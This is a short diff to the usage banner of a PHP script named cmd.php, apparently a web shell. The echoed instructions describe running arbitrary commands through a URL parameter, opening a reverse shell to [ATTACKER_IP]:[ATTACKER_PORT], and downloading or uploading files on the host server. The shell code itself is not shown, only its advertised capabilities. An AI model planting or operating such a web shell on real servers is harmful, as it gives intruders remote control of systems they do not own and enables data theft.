@@ -6,7 +6,7 @@ header('Content-Type: text/plain');
 // Display usage instructions
 echo "// Author: Yavuz Sahbaz\n\n";
 echo "// GitHub: https://github.com/YavuzSahbaz\n\n";
-echo "Usage: cmd.php&cmd=[COMMAND]\n";
+echo "Usage: NOTE ::!!!! SOMETIME IT WORK WITH '?' OR '&' IF PAGE NOT RESPONSE CHECK WITH '?'  cmd.php&cmd=[COMMAND]\n";
 echo "For reverse shell: cmd.php&revshell=[ATTACKER_IP]:[ATTACKER_PORT]\n";
 echo "For downloading a file: cmd.php&download=[URL]&filename=[FILENAME]\n";
 echo "For uploading a file: cmd.php&upload&filepath=[FILE_PATH]\n";
